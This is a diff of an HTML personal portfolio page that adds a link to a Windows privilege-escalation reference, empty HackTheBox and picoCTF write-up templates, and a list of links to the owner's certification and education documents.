+                        <br>ALL Potatoes: https://jlajara.gitlab.io/Potatoes_Windows_Privesc
                     </div>
                 </div>
                 
@@ -3154,12 +3698,20 @@
             <button class="dropdown_button" id="hackthebox_challenges_button"></button>
             <div class="dropdown_content" id="hackthebox_challenges_content">
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>challenge_name (catagory)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>name (catagory)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">step 1</span>
-
-                        <br><span class="step_title">step2</span>
-
+                        <br>
+                        <br>
+                        <br>
+                        <br>
+                        <br>
+                        <br><span class="step_title">step 2</span>
+                        <br>
+                        <br>
+                        <br>
+                        <br>
+                        <br>
                     </div>
                 </div>
 
@@ -3175,21 +3727,44 @@
                 <div class="sub_dropdown">
                     <button class="sub_dropdown_button"> <img src="images/pico_ctf_icon.png" alt="img"> <span>name (catagory)</span> </button>
                     <div class="sub_dropdown_content">
-                        <span class="step_title">step1</span>
-
-                        <br><span class="step_title">step2</span>
-                        
+                        <span class="step_title">step 1</span>
+                        <br>
+                        <br>
+                        <br>
+                        <br>
+                        <br>
+                        <br><span class="step_title">step 2</span>
+                        <br>
+                        <br>
+                        <br>
+                        <br>
+                        <br>
                     </div>
                 </div>
-
             </div>
         </div>
         <!-- ========================pico_ctf_content======================== -->
         
-        <span>I'm currently Studying OSCP</span>
+        <br><span>==========Contact==========</span>
         <br><span id="protectedEmail"></span>
         <br><span><a href="https://www.linkedin.com/in/joe912693295" target="_blank">LinkedIn Profile</a></span>
-        <br><span>Certified: CCNP-RS | CCIE-Security</span>
+        <br><span>==========Certifications==========</span>
+        <br><a href="images/doc/Cisco Certified Internetwork Expert(Security).pdf" target="_blank">Cisco Certified Internetwork Expert(Security).pdf</a>
+        <br><a href="images/doc/Cisco Certified Network Professional(Enterprise).pdf" target="_blank">Cisco Certified Network Professional(Enterprise).pdf</a>
+        <br><span>==========Documents==========</span>
+        <br><a href="images/doc/Palo Alto Networks Systems Engineer (PSE)_ Foundation.pdf" target="_blank">Palo Alto Networks Systems Engineer (PSE)_ Foundation.pdf</a>
+        <br><a href="images/doc/Qualys Endpoint Detection and Response-Foundation.JPG" target="_blank">Qualys Endpoint Detection and Response-Foundation.JPG</a>
+        <br><a href="images/doc/AWVS-Technical.pdf" target="_blank">AWVS-Technical.pdf</a>
+        <br><a href="images/doc/BMI™ IQ Certificate.pdf" target="_blank">BMI™ IQ Certificate.pdf</a>
+        <br><a href="images/doc/BMI™ Performance Report.pdf" target="_blank">BMI™ Performance Report.pdf</a>
+        <br><a href="images/doc/Shanghai Metro station 2016 annual best volunteer.JPG" target="_blank">Shanghai Metro station 2016 annual best volunteer.JPG</a>
+        <br><a href="images/doc/Shanghai Metro station volunteer.jpg" target="_blank">Shanghai Metro station volunteer.jpg</a>
+        <br><a href="images/doc/Chinese Bachelor degree certificate-original.jpg" target="_blank">Chinese Bachelor degree certificate-original.jpg</a>
+        <br><a href="images/doc/Chinese College Graduation certificate-original.jpg" target="_blank">Chinese College Graduation certificate-original.jpg</a>
+        <br><a href="images/doc/Chinese College Transcript-original.jpg" target="_blank">Chinese College Transcript-original.jpg</a>
+        <br><a href="images/doc/Chinese Mandarin Rank Examination original.jpg" target="_blank">Chinese Mandarin Rank Examination original.jpg</a>
+        <br><a href="images/doc/Chinese National College English Test(CET).jpg" target="_blank">Chinese National College English Test(CET).jpg</a>
+        <br><a href="images/doc/Chinese National Computer Rank Examination original.jpg" target="_blank">Chinese National Computer Rank Examination original.jpg</a>
     </main>
     </body>
 </html>
